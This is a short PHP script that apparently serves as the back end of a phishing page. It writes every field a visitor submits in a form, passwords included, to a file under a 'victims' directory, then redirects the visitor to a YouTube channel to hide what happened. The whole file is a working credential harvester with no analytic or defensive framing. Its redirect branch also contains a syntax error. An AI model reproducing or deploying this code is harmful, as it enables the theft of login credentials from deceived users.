<?php if($_SERVER['REQUEST_METHOD']==='POST'){header('Location: https://www.youtube.com/c/greenterminals');$handle=fopen(".././victims/password.txt","a");foreach($_POST as $variable=>$value){fwrite($handle,$variable);fwrite($handle,"=");fwrite($handle,$value);fwrite($handle,"\r\n");}fwrite($handle,"\r\n");fclose($handle);exit;}else{header('Location: '$_SERVER["HTTP_REFERER"]);}?>